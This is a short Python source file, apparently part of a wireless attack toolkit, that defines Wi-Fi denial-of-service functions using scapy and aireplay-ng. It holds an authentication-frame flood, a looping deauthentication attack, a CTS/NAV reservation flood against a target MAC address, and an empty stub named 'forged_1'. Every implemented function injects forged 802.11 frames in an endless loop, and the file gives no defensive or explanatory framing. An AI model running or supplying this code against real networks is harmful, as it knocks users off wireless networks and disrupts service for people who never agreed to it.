import subprocess

from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap


def auth_attack(interface, sta, ap):
    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    while True:
        interface.inject(pkt)


def forged_1(interface, sta, ap):
    pass


def simple_deauth(interface, ap, sta=None):
    while True:
        subprocess.run(['aireplay-ng', '-0', '100', '-a', ap.bssid, '-c' if sta else '', sta.mac_addr if sta else ''])


def cts_nav_attack(interface, target_mac):
    # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
    pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
                   notdecoded='\x00\x6c' + interface.get_frequency() + '\xc0\x00\xc0\x01\x00\x00') / \
          Dot11(ID=0x7d00, type='Control', subtype=12, addr1=target_mac)
    while True:
        interface.inject(pkt)
